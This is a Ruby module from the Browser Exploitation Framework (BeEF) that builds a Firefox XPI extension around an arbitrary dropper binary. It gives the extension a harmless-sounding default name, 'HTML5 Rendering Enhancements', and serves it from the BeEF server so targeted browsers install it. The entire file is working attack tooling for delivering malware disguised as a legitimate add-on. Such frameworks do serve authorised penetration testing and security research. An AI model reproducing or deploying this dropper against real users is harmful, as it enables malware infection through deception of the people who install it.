#
# Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Firefox_extension_dropper < BeEF::Core::Command

  class Bind_extension < BeEF::Core::Router::Router
    before do
      headers 'Content-Type' => 'application/x-xpinstall',
              'Pragma' => 'no-cache',
              'Cache-Control' => 'no-cache',
              'Expires' => '0'
    end

    get '/' do
      response['Content-Type'] = "application/x-xpinstall"
      extension_path = settings.extension_path
      print_info "Serving malicious Firefox Extension (Dropper): #{extension_path}"
      send_file "#{extension_path}",
                :type => 'application/x-xpinstall',
                :disposition => 'inline'
    end
  end

  def pre_send

    # gets the value configured in the module configuration by the user
    @datastore.each do |input|
       if input['name'] == "extension_name"
          @extension_name = input['value']
       end
       if input['name'] == "xpi_name"
          @xpi_name = input['value']
       end
    end

    mod_path = "#{$root_dir}/modules/social_engineering/firefox_extension_dropper"
    extension_path = mod_path + "/extension"

    # clean the build directory
    FileUtils.rm_rf("#{extension_path}/build/.", secure: true)

    # retrieve the name of the dropper binary
    Dir.foreach("#{mod_path}/dropper") do |item|
      if item != "readme.txt" && item != "." && item != ".."
        @dropper = item
        print_info "Using dropper: '#{mod_path}/dropper/#{@dropper}'"
      end
    end
    if @dropper.nil?
      print_error "No dropper found in '#{mod_path}/dropper'"
      return
    end

    # copy in the build directory necessary file, substituting placeholders
    File.open(extension_path + "/build/install.rdf", "w") {|file| file.puts File.read(extension_path + "/install.rdf").gsub!("__extension_name_placeholder__", @extension_name)}
    File.open(extension_path + "/build/bootstrap.js", "w") {|file| file.puts File.read(extension_path + "/bootstrap.js").gsub!("__payload_placeholder__", @dropper)}
    File.open(extension_path + "/build/overlay.xul", "w") {|file| file.puts File.read(extension_path + "/overlay.xul")}
    File.open(extension_path + "/build/chrome.manifest", "w") {|file| file.puts File.read(extension_path + "/chrome.manifest")}
    FileUtils.cp "#{mod_path}/dropper/#{@dropper}", "#{extension_path}/build/#{@dropper}"

    extension_content = ["install.rdf", "bootstrap.js", "overlay.xul", "chrome.manifest", @dropper]

    # create the XPI extension container
    xpi = "#{extension_path}/#{@xpi_name}.xpi"
    if File.exist?(xpi)
       File.delete(xpi)
    end
    Zip::File.open(xpi, Zip::File::CREATE) do |xpi|
      extension_content.each do |filename|
        xpi.add(filename, "#{extension_path}/build/#{filename}")
      end
    end

    # mount the extension in the BeEF web server, calling a specific nested class (needed because we need a specifi content-type/disposition)
    bind_extension = Firefox_extension_dropper::Bind_extension
    bind_extension.set :extension_path, "#{$root_dir}/modules/social_engineering/firefox_extension_dropper/extension/#{@xpi_name}.xpi"
    BeEF::Core::Server.instance.mount("/#{@xpi_name}.xpi", bind_extension.new)
    BeEF::Core::Server.instance.remap
  end

  def self.options
    @configuration = BeEF::Core::Configuration.instance
    proto = @configuration.get("beef.http.https.enable") == true ? "https" : "http"
    beef_host = @configuration.get("beef.http.public") || @configuration.get("beef.http.host")
    beef_port = @configuration.get("beef.http.public_port") || @configuration.get("beef.http.port")
    base_host = "#{proto}://#{beef_host}:#{beef_port}"
    return [
        {'name' => 'extension_name', 'ui_label' => 'Extension name', 'value' => 'HTML5 Rendering Enhancements'},
        {'name' => 'xpi_name', 'ui_label' => 'Extension file (XPI) name', 'value' => 'HTML5_Enhancements'},
        {'name' => 'base_host', 'ui_label' => 'Download from', 'value' => base_host, 'width'=>'150px'}
    ]
  end

  def post_execute
    save({'result' => @datastore['result']})
  end
end
